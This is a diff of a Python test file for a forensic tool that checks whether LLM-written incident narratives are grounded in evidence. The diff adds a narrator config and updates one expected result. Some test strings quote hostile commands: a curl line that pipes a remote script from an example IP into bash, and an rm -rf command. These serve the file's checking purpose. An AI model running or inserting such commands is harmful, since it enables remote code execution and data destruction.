@@ -13,7 +13,7 @@ from evidenceweave.correlation.engine import correlate_case, write_outputs
 from evidenceweave.generator.core import generate
 from evidenceweave.narrator import llm as llm_mod
 from evidenceweave.narrator.llm import LLMResult, parse_sentences
-from evidenceweave.narrator.narrate import narrate_chain
+from evidenceweave.narrator.narrate import NarratorConfig, narrate_chain
 from evidenceweave.narrator.packs import load_events
 from evidenceweave.parsers.pipeline import load_hosts, write_events
 from evidenceweave.schema import Event
@@ -164,7 +164,7 @@ def test_url_user_host_command_checks():
     assert ent("Activity on web01 only.") == []
     assert ent("Activity on ws1 only.", events=(A_OK,)) == [V.HOST_NOT_GROUNDED]
     assert ent("It ran `curl -s http://203.0.113.45:8080/x.sh | bash` once.") == []
-    assert ent('It ran "rm -rf /tmp/stuff" once.') == [V.COMMAND_NOT_GROUNDED]
+    assert ent('It ran "rm -rf /tmp/stuff" once.') == [V.PATH_NOT_GROUNDED, V.COMMAND_NOT_GROUNDED]
     assert ent('It ran "ls" once.') == []  # short strings are not checked
 
 
@@ -338,7 +338,7 @@ def run_verify(prepared, tmp_path, name="case01", handler=None, judge_handler=No
     EVS.update(load_events(d / "events.jsonl"))  # both cases reuse IDs like AUTH-L1: look up the current case only
     seq = []
     narr = FNarr(handler, narr_model, seq)
-    narrate_chain(d, narr)
+    narrate_chain(d, narr, NarratorConfig(mode="raw"))
     narr.calls.clear()
     seq.clear()
     data = load_case_data(d, load_hosts(prepared / "cases" / name))
@@ -434,7 +434,7 @@ def test_executive_summary_union_pool_and_fallback(prepared, tmp_path):
     shutil.copytree(prepared / "out" / "case01", d)
     EVS.clear()
     EVS.update(load_events(d / "events.jsonl"))
-    narrate_chain(d, FNarr())
+    narrate_chain(d, FNarr(), NarratorConfig(mode="raw"))
     data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
     vr = Verifier(data.events, data.host_names)
     ex = data.ctxs["executive_summary"]
